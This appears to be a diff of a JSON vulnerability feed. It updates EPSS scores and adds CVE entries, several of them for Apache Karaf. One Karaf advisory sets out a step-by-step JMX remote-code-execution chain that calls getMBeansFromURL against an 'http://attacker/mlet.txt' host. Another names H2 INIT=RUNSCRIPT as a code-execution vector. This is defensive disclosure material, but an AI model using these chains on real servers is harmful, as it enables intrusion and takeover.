@@ -1,6 +1,19 @@
 {
- "generated": "2026-10-07T11:52:18.448Z",
+ "generated": "2026-10-08T12:09:11.555Z",
  "cves": [
+  {
+   "id": "CVE-2026-106373",
+   "vendor": "Microsoft",
+   "product": "windows",
+   "category": "Windows & Endpoint",
+   "cvss": 8.8,
+   "kev": false,
+   "published": "2026-10-06",
+   "title": "Use after free in Fonts in Google Chrome on on Windows prior to 155.0.8059.39 allowed a remote attacker to...",
+   "summary": "Use after free in Fonts in Google Chrome on on Windows prior to 155.0.8059.39 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+   "affects": [],
+   "epss": 0.00292
+  },
   {
    "id": "CVE-2026-88779",
    "vendor": "Citrix",
@@ -112,7 +125,7 @@
     {
      "vendor": "Apache",
      "product": "http server",
-     "from": "2.4.60",
+     "from": "2.4.0",
      "toExcl": "2.4.69"
     }
    ]
@@ -485,7 +498,7 @@
      "toExcl": "2.4.69"
     }
    ],
-   "epss": 0.00318
+   "epss": 0.00499
   },
   {
    "id": "CVE-2026-85532",
@@ -766,7 +779,7 @@
      "toExcl": "4.0.2"
     }
    ],
-   "epss": 0.00184
+   "epss": 0.00213
   },
   {
    "id": "CVE-2026-89238",
@@ -797,7 +810,7 @@
      "toExcl": "4.0.2"
     }
    ],
-   "epss": 0.00214
+   "epss": 0.00266
   },
   {
    "id": "CVE-2026-92121",
@@ -828,7 +841,7 @@
      "toExcl": "4.0.2"
     }
    ],
-   "epss": 0.00349
+   "epss": 0.00548
   },
   {
    "id": "CVE-2026-95616",
@@ -859,7 +872,7 @@
      "toExcl": "4.0.2"
     }
    ],
-   "epss": 0.00292
+   "epss": 0.00409
   },
   {
    "id": "CVE-2026-100253",
@@ -884,7 +897,7 @@
      "toExcl": "2026.1.4"
     }
    ],
-   "epss": 0.00434
+   "epss": 0.00444
   },
   {
    "id": "CVE-2026-100254",
@@ -909,7 +922,7 @@
      "toExcl": "2026.1.4"
     }
    ],
-   "epss": 0.00461
+   "epss": 0.00471
   },
   {
    "id": "CVE-2026-102317",
@@ -972,7 +985,7 @@
      "toExcl": "2.3.3"
     }
    ],
-   "epss": 0.00363
+   "epss": 0.00528
   },
   {
    "id": "CVE-2026-102496",
@@ -991,7 +1004,7 @@
      "toExcl": "2.3.3"
     }
    ],
-   "epss": 0.00363
+   "epss": 0.00528
   },
   {
    "id": "CVE-2026-102497",
@@ -1010,7 +1023,64 @@
      "toExcl": "2.3.3"
     }
    ],
-   "epss": 0.00363
+   "epss": 0.00528
+  },
+  {
+   "id": "CVE-2026-91012",
+   "vendor": "Apache",
+   "product": "karaf",
+   "category": "Application Platforms",
+   "cvss": 9.8,
+   "kev": false,
+   "published": "2026-09-29",
+   "title": "org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),\nwhich backs the \"config\"...",
+   "summary": "org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),\nwhich backs the \"config\" MBean and the config:* shell commands, derives the file\nit writes a configuration to from caller-supplied input without checking that\nthe result stays inside ${karaf.etc}:\n\n  *  if the submitted property map contains a felix.fileinstall.filename entry, that value is turned directly into a File (getCfgFileFromProperty), so it can point to any absolute path the Karaf process can write to;\n  *  otherwise the configuration PID is concatenated verbatim into the target file name (generateConfigFilename(): new File(karaf.etc, pid + \".cfg\")), so a PID containing \"..\" segments resolves outside ${karaf.etc}. createFactoryConfiguration() has the same issue via the factory PID/alias.\n\n\nBoth code paths are reachable by any caller holding the \"manager\" role under Karaf's shipped command/JMX ACL (org.apache.karaf.command.acl.conf.cfg: \"update = manager\"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to \"admin\" (etc/users.properties, etc/*.acl.*.cfg, etc/org.apache.karaf.management.cfg, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.\n\n\n\n\n\n\nConfigMBeanImpl.install() and the config:install shell command already guarded the equivalent risk on their own code path with a finalname.contains(\"..\") string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to ConfigRepositoryImpl.update() / createFactoryConfiguration() at all.",
+   "affects": [
+    {
+     "vendor": "Apache",
+     "product": "karaf",
+     "toExcl": "4.4.12"
+    }
+   ],
+   "epss": 0.00453
+  },
+  {
+   "id": "CVE-2026-91048",
+   "vendor": "Apache",
+   "product": "karaf",
+   "category": "Application Platforms",
+   "cvss": 9.8,
+   "kev": false,
+   "published": "2026-09-29",
+   "title": "The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg.",
+   "summary": "The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg. Karaf's command guard (SecuredSessionFactoryImpl) treats a command with no matching ACL rule as allowed, so any authenticated shell session (including one holding only the viewer role) could run every jdbc:* command. jdbc:ds-create stores a fully attacker-controlled JDBC URL into a pax-jdbc-config factory Configuration with no validation. pax-jdbc-config reactively turns that into a live DataSource. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2 INIT=RUNSCRIPT), so a viewer-level shell user could reach arbitrary code execution, bypassing the admin-role gate that already protects shell:exec. This is a privilege-escalation-to-RCE chain, not merely an \"admin misconfiguration\".\n\n\nThe same applies to jms:* shell commands.",
+   "affects": [
+    {
+     "vendor": "Apache",
+     "product": "karaf",
+     "toExcl": "4.4.12"
+    }
+   ],
+   "epss": 0.00444
+  },
+  {
+   "id": "CVE-2026-92142",
+   "vendor": "Apache",
+   "product": "karaf",
+   "category": "Application Platforms",
+   "cvss": 8.8,
+   "kev": false,
+   "published": "2026-09-29",
+   "title": "Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access...",
+   "summary": "Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:\n\n\n  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList(\"invoke\", \"getAttribute\", \"getAttributes\", \"setAttribute\", \"setAttributes\"));\n\n\n\n\nThe MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.\n\n\n\n\nAs a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged \"viewer\" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).\n\n\n\n\nThis is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing \"invoke\" check, but the default etc/jmx.acl.cfg grants the \"viewer\" role to any method name matching the wildcard rule \"get* = viewer\", a heuristic intended for read-only getters. Because \"getMBeansFromURL\" happens to start with \"get\", it also matches that rule, so a default installation grants \"viewer\" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a \"viewer\"-role JMX client a path to remote code execution to the Karaf JVM:\n\n  *  Authenticate to JMX as any user with any role (e.g. \"viewer\").\n  *  mbs.createMBean(\"javax.management.loading.MLet\", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.\n  *  mbs.invoke(objectName, \"getMBeansFromURL\", new Object[]{\"http://attacker/mlet.txt\"}, ...) is guarded, but the method name matches the default \"get* = viewer\" ACL rule, so permitted.\n  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.\n  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.\n\n\nThe fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the \"admin\" role. This allows deployments to also write class-name-specific rule, e.g.:\n\n\n\n\ncreateMBean(java.lang.String)[/javax\\.management\\.loading\\..*/] = admin\n\n\n\n\nApache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-\"admin\" JMX credentiels.",
+   "affects": [
+    {
+     "vendor": "Apache",
+     "product": "karaf",
+     "toExcl": "4.4.12"
+    }
+   ],
+   "epss": 0.00518
   },
   {
    "id": "CVE-2026-88771",
@@ -1645,7 +1715,7 @@
      "toExcl": "1.3.2"
     }
    ],
-   "epss": 0.00131
+   "epss": 0.00238
   },
   {
    "id": "CVE-2026-86243",
@@ -1671,7 +1741,7 @@
      "toExcl": "2.0.16"
     }
    ],
-   "epss": 0.00398
+   "epss": 0.00605
   },
   {
    "id": "CVE-2026-86246",
@@ -1697,7 +1767,7 @@
      "toExcl": "2.0.16"
     }
    ],
-   "epss": 0.0028
+   "epss": 0.00361
   },
   {
    "id": "CVE-2026-86247",
@@ -1723,7 +1793,7 @@
      "toExcl": "2.0.16"
     }
    ],
-   "epss": 0.00179
+   "epss": 0.00216
   },
   {
    "id": "CVE-2026-25264",
@@ -2373,6 +2443,24 @@
    ]
   },
   {
+   "id": "CVE-2026-62874",
+   "vendor": "Microsoft",
+   "product": "azure billing",
+   "category": "Cloud & AI Services",
+   "cvss": 10,
+   "kev": false,
+   "published": "2026-09-18",
+   "title": "Insufficient verification of data authenticity in Azure Billing allows an unauthorized attacker to elevate...",
+   "summary": "Insufficient verification of data authenticity in Azure Billing allows an unauthorized attacker to elevate privileges over a network.",
+   "affects": [
+    {
+     "vendor": "Microsoft",
+     "product": "azure billing"
+    }
+   ],
+   "epss": 0.00428
+  },
+  {
    "id": "CVE-2026-93375",
    "vendor": "Microsoft",
    "product": "windows",
@@ -2595,6 +2683,24 @@
      "product": "azure cosmos db"
     }
    ]
+  },
+  {
+   "id": "CVE-2026-78501",
+   "vendor": "Microsoft",
+   "product": "365 copilot chat",
+   "category": "Cloud & AI Services",
+   "cvss": 7.4,
+   "kev": false,
+   "published": "2026-09-17",
+   "title": "Improper neutralization of special elements used in a command ('command injection') in Microsoft 365...",
+   "summary": "Improper neutralization of special elements used in a command ('command injection') in Microsoft 365 Copilot's Business Chat allows an unauthorized attacker to disclose information over a network.",
+   "affects": [
+    {
+     "vendor": "Microsoft",
+     "product": "365 copilot chat"
+    }
+   ],
+   "epss": 0.00893
   },
   {
    "id": "CVE-2025-14871",
@@ -8841,7 +8947,7 @@
      "toExcl": "152.0.4191.52"
     }
    ],
-   "epss": 0.00663
+   "epss": 0.00549
   },
   {
    "id": "CVE-2026-49362",
@@ -13570,8 +13676,8 @@
    "cvss": 7.8,
    "kev": false,
    "published": "2026-09-08",
-   "title": "Heap-based buffer overflow in Windows Error Reporting allows an authorized attacker to elevate privileges...",
-   "summary": "Heap-based buffer overflow in Windows Error Reporting allows an authorized attacker to elevate privileges locally.",
+   "title": "Heap-based buffer overflow in Windows State Repository Service allows an authorized attacker to elevate...",
+   "summary": "Heap-based buffer overflow in Windows State Repository Service allows an authorized attacker to elevate privileges locally.",
    "epss": 0.00333,
    "affects": []
   },
@@ -23320,6 +23426,59 @@
     }
    ],
    "epss": 0.01174
+  },
+  {
+   "id": "CVE-2026-65669",
+   "vendor": "Microsoft",
+   "product": "sql server management studio",
+   "category": "Databases & Middleware",
+   "cvss": 9.6,
+   "kev": false,
+   "published": "2026-09-08",
+   "title": "Improper neutralization of special elements in output used by a downstream component ('injection') in SQL...",
+   "summary": "Improper neutralization of special elements in output used by a downstream component ('injection') in SQL Server allows an unauthorized attacker to elevate privileges over a network.",
+   "affects": [
+    {
+     "vendor": "Microsoft",
+     "product": "sql server management studio",
+     "from": "22.0",
+     "toExcl": "22.8.2"
+    }
+   ],
+   "epss": 0.00882
+  },
+  {
+   "id": "CVE-2026-65772",
+   "vendor": "Microsoft",
+   "product": "dynamics 365",
+   "category": "ERP & Business Apps",
+   "cvss": 8.8,
+   "kev": false,
+   "published": "2026-09-08",
+   "title": "Deserialization of untrusted data in Microsoft Dynamics 365 allows an authorized attacker to execute code...",
+   "summary": "Deserialization of untrusted data in Microsoft Dynamics 365 allows an authorized attacker to execute code over a network.",
+   "affects": [
+    {
+     "vendor": "Microsoft",
+     "product": "dynamics 365",
+     "from": "9.1",
+     "toExcl": "9.1.0046.0006"
+    }
+   ],
+   "epss": 0.01693
+  },
+  {
+   "id": "CVE-2026-78446",
+   "vendor": "Microsoft",
+   "product": "windows",
+   "category": "Windows & Endpoint",
+   "cvss": 7.5,
+   "kev": false,
+   "published": "2026-09-08",
+   "title": "Use after free in Windows Distributed File System (DFS) allows an authorized attacker to execute code over a...",
+   "summary": "Use after free in Windows Distributed File System (DFS) allows an authorized attacker to execute code over a network.",
+   "affects": [],
+   "epss": 0.00828
   },
   {
    "id": "CVE-2026-78254",
